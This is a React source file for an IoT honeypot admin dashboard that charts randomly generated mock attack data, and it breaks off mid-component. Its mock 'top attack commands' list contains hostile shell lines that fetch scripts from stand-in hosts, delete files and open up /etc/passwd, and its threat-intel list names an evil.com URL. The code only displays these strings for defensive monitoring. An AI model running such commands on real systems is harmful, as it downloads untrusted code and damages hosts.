import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Input } from '@/components/ui/input'
import { Switch } from '@/components/ui/switch'
import { Label } from '@/components/ui/label'
import { 
  Shield, Activity, Globe, Users, AlertTriangle, TrendingUp, Server, LogOut,
  Eye, Brain, Clock, Zap, Settings, Download, Filter, Search, Play, Pause,
  Download as DownloadIcon, Upload, Cpu, HardDrive, Network, ShieldAlert,
  MapPin, Flag, Calendar, BarChart3, FileText, Terminal, Lock, Unlock,
  Moon, Sun, Database, Key, Wifi, WifiOff, Scan, Cctv, Bug, GitBranch,
  Monitor // Added Monitor icon
} from 'lucide-react'
import { 
  LineChart, Line, AreaChart, Area, BarChart, Bar, PieChart, Pie, Cell, 
  XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, Legend
} from 'recharts'

const AdminDashboard = ({ user, onLogout }) => {
  const [activeTab, setActiveTab] = useState('overview')
  const [realTimeData, setRealTimeData] = useState([])
  const [isLive, setIsLive] = useState(true)
  const [searchTerm, setSearchTerm] = useState('')
  const [selectedAttack, setSelectedAttack] = useState(null)
  const [timeRange, setTimeRange] = useState('24h')
  const [darkMode, setDarkMode] = useState(false)
  const [autoBlock, setAutoBlock] = useState(true)
  const [notifications, setNotifications] = useState(true)

  // ------------------- ENHANCED MOCK DATA -------------------
  const generateAttackData = () =>
    Array.from({ length: 24 }, (_, i) => ({
      time: `${i}:00`,
      attacks: Math.floor(Math.random() * 50) + 20,
      ssh: Math.floor(Math.random() * 30) + 5,
      telnet: Math.floor(Math.random() * 20) + 3,
      http: Math.floor(Math.random() * 15) + 2,
      ftp: Math.floor(Math.random() * 10) + 1,
      smb: Math.floor(Math.random() * 8) + 1,
      rdp: Math.floor(Math.random() * 5) + 1,
      severity: Math.floor(Math.random() * 10) + 1
    }))

  const mockAttackData = generateAttackData()

  const mockGeoData = [
    { country: 'China', attacks: 156, percentage: 35, flag: '🇨🇳', risk: 'High' },
    { country: 'Russia', attacks: 89, percentage: 20, flag: '🇷🇺', risk: 'High' },
    { country: 'USA', attacks: 67, percentage: 15, flag: '🇺🇸', risk: 'Medium' },
    { country: 'Brazil', attacks: 45, percentage: 10, flag: '🇧🇷', risk: 'Medium' },
    { country: 'India', attacks: 34, percentage: 8, flag: '🇮🇳', risk: 'Low' },
    { country: 'Others', attacks: 54, percentage: 12, flag: '🌍', risk: 'Low' },
  ]

  const mockAttackMethods = [
    { name: 'SSH Brute Force', port: 22, count: 345, success: 12, icon: Terminal },
    { name: 'FTP Anonymous', port: 21, count: 234, success: 8, icon: Upload },
    { name: 'Telnet Attack', port: 23, count: 189, success: 5, icon: Server },
    { name: 'HTTP Exploit', port: 80, count: 167, success: 3, icon: Globe },
    { name: 'SMB Share', port: 445, count: 145, success: 6, icon: Database },
    { name: 'RDP Attack', port: 3389, count: 98, success: 2, icon: Monitor }, // Fixed: Using Monitor icon
    { name: 'MySQL Attack', port: 3306, count: 76, success: 1, icon: Database },
    { name: 'VNC Attack', port: 5900, count: 54, success: 0, icon: Eye },
  ]

  const mockTopCommands = [
    { command: 'cat /proc/cpuinfo', count: 120, risk: 'medium', type: 'recon', service: 'SSH' },
    { command: 'wget http://malicious.com/script.sh', count: 95, risk: 'high', type: 'malware', service: 'HTTP' },
    { command: 'ps aux', count: 65, risk: 'low', type: 'recon', service: 'SSH' },
    { command: 'uname -a', count: 50, risk: 'low', type: 'recon', service: 'SSH' },
    { command: 'curl -O http://exploit.com/exploit.py', count: 42, risk: 'high', type: 'exploit', service: 'HTTP' },
    { command: 'rm -rf /tmp/*', count: 30, risk: 'medium', type: 'destructive', service: 'SSH' },
    { command: 'passwd', count: 25, risk: 'high', type: 'privilege', service: 'SSH' },
    { command: 'chmod 777 /etc/passwd', count: 18, risk: 'critical', type: 'privilege', service: 'SSH' },
    { command: 'USER anonymous', count: 45, risk: 'medium', type: 'access', service: 'FTP' },
    { command: 'PUT malware.exe', count: 23, risk: 'high', type: 'upload', service: 'FTP' },
  ]

  const mockRecentAttacks = Array.from({ length: 15 }, (_, i) => ({
    id: i + 1,
    ip: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    country: ['CN','RU','US','BR','IN','DE','FR','UK','JP','KR'][i % 10],
    time: `${Math.floor(Math.random() * 59)} min ago`,
    service: ['SSH','Telnet','HTTP','FTP','SMB','RDP','MySQL','VNC'][i % 8],
    status: ['blocked','captured','analyzing','quarantined'][i % 4],
    severity: ['low', 'medium', 'high', 'critical'][Math.floor(Math.random() * 4)],
    duration: `${Math.floor(Math.random() * 45) + 1}m`,
    commands: Math.floor(Math.random() * 20) + 1,
    location: `${['Beijing', 'Moscow', 'New York', 'São Paulo', 'Mumbai'][i % 5]}, ${['China', 'Russia', 'USA', 'Brazil', 'India'][i % 5]}`,
    isp: `${['China Telecom', 'Rostelecom', 'Comcast', 'Vivo', 'Airtel'][i % 5]}`,
    payload: `malware_${Math.floor(Math.random() * 1000)}.bin`,
    method: ['Brute Force', 'Exploit', 'Malware Upload', 'Reconnaissance'][i % 4],
    port: [22, 21, 23, 80, 445, 3389, 3306, 5900][i % 8],
    username: ['root', 'admin', 'user', 'anonymous'][i % 4],
    password: ['123456', 'password', 'admin', 'test'][i % 4]
  }))

  const mockAttackPatterns = [
    { type: 'Brute Force', count: 234, successRate: '12%', avgDuration: '15m', services: ['SSH', 'FTP', 'Telnet'] },
    { type: 'Exploit Attempt', count: 167, successRate: '3%', avgDuration: '8m', services: ['HTTP', 'SMB'] },
    { type: 'Malware Download', count: 89, successRate: '8%', avgDuration: '25m', services: ['HTTP', 'FTP'] },
    { type: 'Reconnaissance', count: 543, successRate: '0%', avgDuration: '5m', services: ['All'] },
    { type: 'Data Exfiltration', count: 34, successRate: '1%', avgDuration: '42m', services: ['FTP', 'SSH'] },
  ]

  const mockThreatIntel = [
    { ioc: '192.168.1.100', type: 'IP', severity: 'high', firstSeen: '2 hours ago', lastSeen: '15 min ago', confidence: 85 },
    { ioc: 'malware_x64.bin', type: 'File Hash', severity: 'critical', firstSeen: '1 day ago', lastSeen: '2 hours ago', confidence: 95 },
    { ioc: 'http://evil.com/script', type: 'URL', severity: 'medium', firstSeen: '3 days ago', lastSeen: '1 day ago', confidence: 70 },
    { ioc: 'user:root/pass:12345', type: 'Credentials', severity: 'low', firstSeen: '6 hours ago', lastSeen: '6 hours ago', confidence: 60 },
  ]

  const COLORS = ['#8884d8', '#82ca9d', '#ffc658', '#ff7300', '#8dd1e1', '#d084d0', '#ff6b6b', '#a8e6cf']
  const SEVERITY_COLORS = { low: '#22c55e', medium: '#eab308', high: '#f97316', critical: '#ef4444' }

  // ------------------- REAL-TIME DATA -------------------
  useEffect(() => {
    const interval = setInterval(() => {
      if (isLive) {
        const newData = {
          time: new Date().toLocaleTimeString(),
          attacks: Math.floor(Math.random() * 50) + 10,
          ssh: Math.floor(Math.random() * 30) + 5,
          telnet: Math.floor(Math.random() * 20) + 3,
          http: Math.floor(Math.random() * 15) + 1,
          ftp: Math.floor(Math.random() * 10) + 1,
          smb: Math.floor(Math.random() * 8) + 1,
          rdp: Math.floor(Math.random() * 5) + 1,
          severity: Math.floor(Math.random() * 10) + 1
        }
        setRealTimeData(prev => [...prev.slice(-19), newData])
      }
    }, 3000)
    return () => clearInterval(interval)
  }, [isLive])

  // ------------------- DARK MODE EFFECT -------------------
  useEffect(() => {
    if (darkMode) {
      document.documentElement.classList.add('dark')
    } else {
      document.documentElement.classList.remove('dark')
    }
  }, [darkMode])

  // ------------------- FILTERED DATA -------------------
  const filteredAttacks = mockRecentAttacks.filter(attack =>
    attack.ip.toLowerCase().includes(searchTerm.toLowerCase()) ||
    attack.country.toLowerCase().includes(searchTerm.toLowerCase()) ||
    attack.service.toLowerCase().includes(searchTerm.toLowerCase()) ||
    attack.method.toLowerCase().includes(searchTerm.toLowerCase())
  )

  // ------------------- STAT CARD -------------------
  const StatCard = ({ title, value, change, icon: Icon, color = 'blue', subtitle }) => (
    <Card className="hover:shadow-lg transition-all duration-200 hover:scale-[1.02] border">
      <CardContent className="p-6 flex justify-between items-center">
        <div>
          <p className="text-sm font-medium text-muted-foreground">{title}</p>
          <p className="text-2xl font-bold">{value}</p>
          {subtitle && <p className="text-xs text-muted-foreground mt-1">{subtitle}</p>}
          {change !== undefined && (
            <p className={`text-xs flex items-center mt-1 ${change > 0 ? 'text-green-600' : 'text-red-600'}`}>
              <TrendingUp className="w-3 h-3 mr-1" /> {change > 0 ? '+' : ''}{change}% from last hour
            </p>
          )}
        </div>
        <div className={`p-3 rounded-full bg-${color}-100 dark:bg-${color}-900/20`}>
          <Icon className={`w-6 h-6 text-${color}-600`} />
        </div>
      </CardContent>
    </Card>
  )

  // ------------------- ATTACK DETAIL MODAL -------------------
  const AttackDetailModal = ({ attack, onClose }) => {
    if (!attack) return null

    return (
      <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
        <Card className="w-full max-w-4xl max-h-[90vh] overflow-y-auto">
          <CardHeader>
            <CardTitle className="flex items-center justify-between">
              <span>Attack Session Details</span>
              <Button variant="ghost" size="sm" onClick={onClose}>
                ✕
              </Button>
            </CardTitle>
            <CardDescription>Complete forensic information about the attack</CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Basic Information */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">IP Address</label>
                <p className="font-mono text-lg bg-muted p-2 rounded">{attack.ip}</p>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Country</label>
                <p className="flex items-center gap-2 text-lg">
                  <Flag className="w-4 h-4" />
                  {attack.country}
                </p>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Service</label>
                <Badge variant="outline" className="text-lg">{attack.service}</Badge>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Port</label>
                <p className="font-mono text-lg">{attack.port}</p>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Severity</label>
                <Badge 
                  variant="outline" 
                  className="text-lg"
                  style={{ 
                    backgroundColor: SEVERITY_COLORS[attack.severity] + '20', 
                    color: SEVERITY_COLORS[attack.severity],
                    borderColor: SEVERITY_COLORS[attack.severity]
                  }}
                >
                  {attack.severity}
                </Badge>
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Status</label>
                <Badge variant={
                  attack.status === 'blocked' ? 'destructive' : 
                  attack.status === 'captured' ? 'default' : 
                  attack.status === 'analyzing' ? 'secondary' : 'outline'
                }>
                  {attack.status}
                </Badge>
              </div>
            </div>

            {/* Timeline & Duration */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-2">
                <label className="text-sm font-medium">Timeline</label>
                <div className="space-y-2 p-4 rounded-lg border">
                  <div className="flex justify-between">
                    <span>First detected</span>
                    <span>{attack.time}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Session started</span>
                    <span>{attack.time}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Session ended</span>
                    <span>Just now</span>
                  </div>
                  <div className="flex justify-between font-medium">
                    <span>Total duration</span>
                    <span>{attack.duration}</span>
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium">Attack Method</label>
                <div className="p-4 rounded-lg border">
                  <p className="font-medium">{attack.method}</p>
                  <p className="text-sm text-muted-foreground mt-1">Commands executed: {attack.commands}</p>
                </div>
              </div>
            </div>

            {/* Location & Network Info */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-2">
                <label className="text-sm font-medium">Geographic Information</label>
                <div className="p-4 rounded-lg border">
                  <p className="flex items-center gap-2">
                    <MapPin className="w-4 h-4" />
                    {attack.location}
                  </p>
                  <p className="text-sm text-muted-foreground mt-2">ISP: {attack.isp}</p>
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium">Authentication Attempt</label>
                <div className="p-4 rounded-lg border font-mono text-sm">
                  <div>Username: {attack.username}</div>
                  <div>Password: {attack.password}</div>
                </div>
              </div>
            </div>

            {/* Payload & Commands */}
            <div className="space-y-2">
              <label className="text-sm font-medium">Payload Information</label>
              <div className="p-4 rounded-lg border">
                <p className="font-mono text-sm bg-muted p-2 rounded">{attack.payload}</p>
                <p className="text-xs text-muted-foreground mt-2">MD5: a1b2c3d4e5f678901234567890123456</p>
              </div>
            </div>

            {/* Actions */}
            <div className="flex gap-2 pt-4">
              <Button variant="outline" className="flex-1">
                <DownloadIcon className="w-4 h-4 mr-2" />
                Export Full Logs
              </Button>
              <Button variant="outline" className="flex-1">
                <ShieldAlert className="w-4 h-4 mr-2" />
                Block This IP
              </Button>
              <Button variant="outline" className="flex-1">
                <GitBranch className="w-4 h-4 mr-2" />
                Trace Route
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // ------------------- USAGE GUIDE COMPONENT -------------------
  const UsageGuide = () => (
    <Card>
      <CardHeader>
        <CardTitle>IoT Honeypot Dashboard Usage Guide</CardTitle>
        <CardDescription>Learn how to effectively monitor and analyze attacks</CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="space-y-4">
            <h3 className="font-semibold text-lg">📊 Dashboard Overview</h3>
            <ul className="space-y-2 text-sm">
              <li>• <strong>Real-time Monitoring:</strong> Live attack feed updates every 3 seconds</li>
              <li>• <strong>Attack Statistics:</strong> View total attacks, unique IPs, and threat levels</li>
              <li>• <strong>Geographic Data:</strong> See attack sources by country on the map</li>
              <li>• <strong>Service Analysis:</strong> Monitor different attack methods (SSH, FTP, HTTP, etc.)</li>
            </ul>

            <h3 className="font-semibold text-lg mt-4">🛡️ Attack Analysis</h3>
            <ul className="space-y-2 text-sm">
              <li>• <strong>Click any attack</strong> to view detailed forensic information</li>
              <li>• <strong>Search and filter</strong> attacks by IP, country, or service</li>
              <li>• <strong>Export data</strong> for further analysis or reporting</li>
              <li>• <strong>Block IPs</strong> directly from attack details</li>
            </ul>
          </div>

          <div className="space-y-4">
            <h3 className="font-semibold text-lg">🔧 Service Ports Monitored</h3>
            <div className="grid grid-cols-2 gap-2 text-sm">
              <div className="flex items-center gap-2 p-2 border rounded">
                <Terminal className="w-4 h-4" />
                <span>SSH (22)</span>
              </div>
              <div className="flex items-center gap-2 p-2 border rounded">
                <Upload className="w-4 h-4" />
                <span>FTP (21)</span>
              </div>
              <div className="flex items-center gap-2 p-2 border rounded">
                <Server className="w-4 h-4" />
                <span>Telnet (23)</span>
              </div>
              <div className="flex items-center gap-2 p-2 border rounded">
                <Globe className="w-4 h-4" />
                <span>HTTP (80)</span>
              </div>
              <div className="flex items-center gap-2 p-2 border rounded">
                <Database className="w-4 h-4" />
                <span>SMB (445)</span>
              </div>
              <div className="flex items-center gap-2 p-2 border rounded">
                <Monitor className="w-4 h-4" />
                <span>RDP (3389)</span>
              </div>
            </div>

            <h3 className="font-semibold text-lg mt-4">⚡ Quick Actions</h3>
            <ul className="space-y-2 text-sm">
              <li>• <strong>Pause/Resume:</strong> Temporarily stop live data updates</li>
              <li>• <strong>Time Range:</strong> Change analysis period (1h, 24h, 7d, 30d)</li>
              <li>• <strong>Dark Mode:</strong> Toggle between light and dark themes</li>
              <li>• <strong>Export:</strong> Download attack data in CSV format</li>
            </ul>
          </div>
        </div>

        <div className="p-4 rounded-lg bg-muted/50">
          <h3 className="font-semibold text-lg mb-2">🎯 Best Practices</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
            <div>
              <h4 className="font-medium mb-1">Monitoring</h4>
              <ul className="space-y-1">
                <li>• Check high-severity attacks immediately</li>
                <li>• Monitor geographic patterns</li>
                <li>• Review command frequency</li>
              </ul>
            </div>
            <div>
              <h4 className="font-medium mb-1">Response</h4>
              <ul className="space-y-1">
                <li>• Block repeated offenders</li>
                <li>• Analyze successful attacks</li>
                <li>• Update firewall rules</li>
              </ul>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b bg-card/50 backdrop-blur-sm sticky top-0 z-40">
        <div className="flex h-16 items-center justify-between px-6">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-2">
              <Shield className="w-8 h-8 text-blue-600" />
              <h1 className="text-xl font-bold">IoT Honeypot Admin</h1>
            </div>
            <Badge variant={isLive ? 'default' : 'secondary'} className="animate-pulse flex items-center space-x-1">
              <Activity className="w-3 h-3" />
              <span>{isLive ? 'LIVE' : 'PAUSED'}</span>
            </Badge>
          </div>
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-2">
              <Calendar className="w-4 h-4 text-muted-foreground" />
              <select 
                value={timeRange}
                onChange={(e) => setTimeRange(e.target.value)}
                className="bg-transparent border-none text-sm focus:outline-none"
              >
                <option value="1h">Last Hour</option>
                <option value="24h">Last 24 Hours</option>
                <option value="7d">Last 7 Days</option>
                <option value="30d">Last 30 Days</option>
              </select>
            </div>
            
            {/* Dark Mode Toggle */}
            <Button 
              variant="ghost" 
              size="sm" 
              onClick={() => setDarkMode(!darkMode)}
              className="flex items-center gap-2"
            >
              {darkMode ? <Sun className="w-4 h-4" /> : <Moon className="w-4 h-4" />}
              {darkMode ? 'Light' : 'Dark'}
            </Button>

            <span className="text-sm text-muted-foreground">Welcome, {user?.name || 'Admin'}</span>
            <Button variant="outline" size="sm" onClick={onLogout}>
              <LogOut className="w-4 h-4 mr-2" />
              Logout
            </Button>
          </div>
        </div>
      </header>

      <div className="p-6 space-y-6">
        {/* Enhanced Stats */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
          <StatCard title="Total Attacks Today" value="1,247" change={12} icon={AlertTriangle} color="red" subtitle="+142 this hour" />
          <StatCard title="Unique IPs" value="89" change={-3} icon={Globe} color="blue" subtitle="12 countries" />
          <StatCard title="Active Sessions" value="23" change={8} icon={Users} color="green" subtitle="8 being analyzed" />
          <StatCard title="Threat Level" value="High" change={15} icon={ShieldAlert} color="orange" subtitle="Elevated risk" />
        </div>

        {/* Tabs */}
        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-8">
            <TabsTrigger value="overview">Overview</TabsTrigger>
            <TabsTrigger value="realtime">Real-time</TabsTrigger>
            <TabsTrigger value="attacks">Attacks</TabsTrigger>
            <TabsTrigger value="services">Services</TabsTrigger>
            <TabsTrigger value="geography">Geography</TabsTrigger>
            <TabsTrigger value="threats">Threat Intel</TabsTrigger>
            <TabsTrigger value="settings">Settings</TabsTrigger>
            <TabsTrigger value="guide">Usage Guide</TabsTrigger>
          </TabsList>

          {/* ------------------- OVERVIEW TAB ------------------- */}
          <TabsContent value="overview" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>Attack Timeline ({timeRange})</CardTitle>
                  <CardDescription>Multi-service attack patterns including FTP, SMB, RDP</CardDescription>
                </CardHeader>
                <CardContent>
                  <ResponsiveContainer width="100%" height={300}>
                    <AreaChart data={mockAttackData}>
                      <CartesianGrid strokeDasharray="3 3" />
                      <XAxis dataKey="time" />
                      <YAxis />
                      <Tooltip />
                      <Legend />
                      <Area type="monotone" dataKey="ssh" stackId="1" stroke="#8884d8" fill="#8884d8" />
                      <Area type="monotone" dataKey="telnet" stackId="1" stroke="#82ca9d" fill="#82ca9d" />
                      <Area type="monotone" dataKey="http" stackId="1" stroke="#ffc658" fill="#ffc658" />
                      <Area type="monotone" dataKey="ftp" stackId="1" stroke="#ff7300" fill="#ff7300" />
                      <Area type="monotone" dataKey="smb" stackId="1" stroke="#8dd1e1" fill="#8dd1e1" />
                    </AreaChart>
                  </ResponsiveContainer>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Top Attack Commands</CardTitle>
                  <CardDescription>Most frequently executed commands across all services</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3 max-h-[300px] overflow-y-auto">
                    {mockTopCommands.map((cmd, idx) => (
                      <div key={idx} className="flex items-center justify-between p-3 rounded-lg border hover:bg-muted/50 transition-colors">
                        <div className="flex-1 min-w-0">
                          <code className="text-sm font-mono block truncate">{cmd.command}</code>
                          <div className="flex items-center space-x-2 mt-1">
                            <Badge variant={cmd.risk === 'high' || cmd.risk === 'critical' ? 'destructive' : cmd.risk === 'medium' ? 'default' : 'secondary'}>
                              {cmd.risk}
                            </Badge>
                            <Badge variant="outline" className="text-xs">
                              {cmd.type}
                            </Badge>
                            <Badge variant="outline" className="text-xs">
                              {cmd.service}
                            </Badge>
                            <span className="text-xs text-muted-foreground">{cmd.count} times</span>
                          </div>
                        </div>
                        <Button variant="ghost" size="sm">
                          <Terminal className="w-4 h-4" />
                        </Button>
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Attack Patterns */}
            <Card>
              <CardHeader>
                <CardTitle>Attack Patterns</CardTitle>
                <CardDescription>Common attack methodologies detected across services</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
                  {mockAttackPatterns.map((pattern, idx) => (
                    <Card key={idx} className="text-center p-4 hover:shadow-md transition-shadow">
                      <CardContent className="p-0">
                        <div className="text-2xl font-bold text-primary">{pattern.count}</div>
                        <div className="text-sm font-medium mt-1">{pattern.type}</div>
                        <div className="text-xs text-muted-foreground mt-2">
                          Success: {pattern.successRate} • Avg: {pattern.avgDuration}
                        </div>
                        <div className="text-xs text-muted-foreground mt-1">
                          Services: {pattern.services.join(', ')}
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* ------------------- REAL-TIME TAB ------------------- */}
          <TabsContent value="realtime" className="space-y-6">
            <div className="flex items-center justify-between">
              <h2 className="text-2xl font-bold">Real-time Monitoring</h2>
              <div className="flex items-center space-x-2">
                <Button variant={isLive ? 'destructive' : 'default'} onClick={() => setIsLive(!isLive)}>
                  {isLive ? <Pause className="w-4 h-4 mr-2" /> : <Play className="w-4 h-4 mr-2" />}
                  {isLive ? 'Pause' : 'Resume'} Live Feed
                </Button>
                <Button variant="outline">
                  <Download className="w-4 h-4 mr-2" />
                  Export Data
                </Button>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>Live Attack Stream</CardTitle>
                  <CardDescription>Real-time attack visualization across all services</CardDescription>
                </CardHeader>
                <CardContent>
                  <ResponsiveContainer width="100%" height={300}>
                    <LineChart data={realTimeData}>
                      <CartesianGrid strokeDasharray="3 3" />
                      <XAxis dataKey="time" />
                      <YAxis />
                      <Tooltip />
                      <Legend />
                      <Line type="monotone" dataKey="attacks" stroke="#8884d8" strokeWidth={2} dot={false} />
                      <Line type="monotone" dataKey="ssh" stroke="#82ca9d" strokeWidth={2} dot={false} />
                      <Line type="monotone" dataKey="telnet" stroke="#ffc658" strokeWidth={2} dot={false} />
                      <Line type="monotone" dataKey="http" stroke="#ff7300" strokeWidth={2} dot={false} />
                      <Line type="monotone" dataKey="ftp" stroke="#8dd1e1" strokeWidth={2} dot={false} />
                    </LineChart>
                  </ResponsiveContainer>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Attack Severity Distribution</CardTitle>
                  <CardDescription>Real-time threat level analysis</CardDescription>
                </CardHeader>
                <CardContent>
                  <ResponsiveContainer width="100%" height={300}>
                    <BarChart data={realTimeData.slice(-10)}>
                      <CartesianGrid strokeDasharray="3 3" />
                      <XAxis dataKey="time" />
                      <YAxis />
                      <Tooltip />
                      <Legend />
                      <Bar dataKey="severity" fill="#ff6b6b" radius={[4, 4, 0, 0]} />
                    </BarChart>
                  </ResponsiveContainer>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* ------------------- ATTACKS TAB ------------------- */}
          <TabsContent value="attacks" className="space-y-6">
            <div className="flex items-center justify-between">
              <h2 className="text-2xl font-bold">Attack Sessions</h2>
              <div className="flex items-center space-x-2">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
                  <Input
                    placeholder="Search attacks..."
                    className="pl-9 w-[250px]"
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                  />
                </div>
                <Button variant="outline">
                  <Filter className="w-4 h-4 mr-2" />
                  Filter
                </Button>
                <Button variant="outline">
                  <Download className="w-4 h-4 mr-2" />
                  Export
                </Button>
              </div>
            </div>

            <Card>
              <CardHeader>
                <CardTitle>Recent Attack Sessions</CardTitle>
                <CardDescription>Detailed view of all captured attacks with complete forensic data</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {filteredAttacks.map((attack) => (
                    <div 
                      key={attack.id} 
                      className="flex items-center justify-between p-4 rounded-lg border hover:bg-muted/50 transition-colors cursor-pointer"
                      onClick={() => setSelectedAttack(attack)}
                    >
                      <div className="flex items-center space-x-4">
                        <div className={`w-3 h-3 rounded-full ${
                          attack.severity === 'critical' ? 'bg-red-500' :
                          attack.severity === 'high' ? 'bg-orange-500' :
                          attack.severity === 'medium' ? 'bg-yellow-500' : 'bg-green-500'
                        } animate-pulse`}></div>
                        <div>
                          <div className="font-mono text-sm font-medium">{attack.ip}</div>
                          <div className="text-xs text-muted-foreground flex items-center gap-2">
                            <Flag className="w-3 h-3" />
                            {attack.country} • {attack.service}:{attack.port} • {attack.method} • {attack.duration} • {attack.commands} commands
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center space-x-3">
                        <Badge variant={
                          attack.status === 'blocked' ? 'destructive' : 
                          attack.status === 'captured' ? 'default' : 
                          attack.status === 'analyzing' ? 'secondary' : 'outline'
                        }>
                          {attack.status}
                        </Badge>
                        <Badge 
                          variant="outline"
                          style={{ 
                            backgroundColor: SEVERITY_COLORS[attack.severity] + '20', 
                            color: SEVERITY_COLORS[attack.severity],
                            borderColor: SEVERITY_COLORS[attack.severity]
                          }}
                        >
                          {attack.severity}
                        </Badge>
                        <span className="text-xs text-muted-foreground min-w-[80px] text-right">{attack.time}</span>
                        <Button variant="ghost" size="sm">
                          <Eye className="w-4 h-4" />
                        </Button>
                      </div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* ------------------- SERVICES TAB ------------------- */}
          <TabsContent value="services" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>Service Attack Analysis</CardTitle>
                <CardDescription>Detailed breakdown of attacks by service type</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                  {mockAttackMethods.map((method, index) => (
                    <Card key={index} className="hover:shadow-lg transition-all duration-200">
                      <CardContent className="p-6">
                        <div className="flex items-center justify-between mb-4">
                          <method.icon className="w-8 h-8 text-blue-600" />
                          <Badge variant="outline">Port {method.port}</Badge>
                        </div>
                        <h3 className="font-semibold text-lg mb-2">{method.name}</h3>
                        <div className="space-y-2 text-sm">
                          <div className="flex justify-between">
                            <span>Total Attacks:</span>
                            <span className="font-mono">{method.count}</span>
                          </div>
                          <div className="flex justify-between">
                            <span>Success Rate:</span>
                            <span className="font-mono">{method.success}%</span>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </CardContent>
            </Card>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>Service Distribution</CardTitle>
                  <CardDescription>Attack volume by service type</CardDescription>
                </CardHeader>
                <CardContent>
                  <ResponsiveContainer width="100%" height={300}>
                    <PieChart>
                      <Pie
                        data={mockAttackMethods}
                        cx="50%"
                        cy="50%"
                        labelLine={false}
                        label={({ name, count }) => `${name}: ${count}`}
                        outerRadius={80}
                        fill="#8884d8"
                        dataKey="count"
                      >
                        {mockAttackMethods.map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                        ))}
                      </Pie>
                      <Tooltip />
                    </PieChart>
                  </ResponsiveContainer>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Service Success Rates</CardTitle>
                  <CardDescription>Attack success percentage by service</CardDescription>
                </CardHeader>
                <CardContent>
                  <ResponsiveContainer width="100%" height={300}>
                    <BarChart data={mockAttackMethods}>
                      <CartesianGrid strokeDasharray="3 3" />
                      <XAxis dataKey="name" angle={-45} textAnchor="end" height={80} />
                      <YAxis />
                      <Tooltip />
                      <Bar dataKey="success" fill="#8884d8" radius={[4, 4, 0, 0]} />
                    </BarChart>
                  </ResponsiveContainer>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* ------------------- GEOGRAPHY TAB ------------------- */}
          <TabsContent value="geography" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>Attack Sources by Country</CardTitle>
                  <CardDescription>Geographic distribution of attacks</CardDescription>
                </CardHeader>
                <CardContent>
                  <ResponsiveContainer width="100%" height={300}>
                    <PieChart>
                      <Pie
                        data={mockGeoData}
                        cx="50%"
                        cy="50%"
                        labelLine={false}
                        label={({ name, percentage }) => `${name} ${percentage}%`}
                        outerRadius={80}
                        fill="#8884d8"
                        dataKey="attacks"
                      >
                        {mockGeoData.map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                        ))}
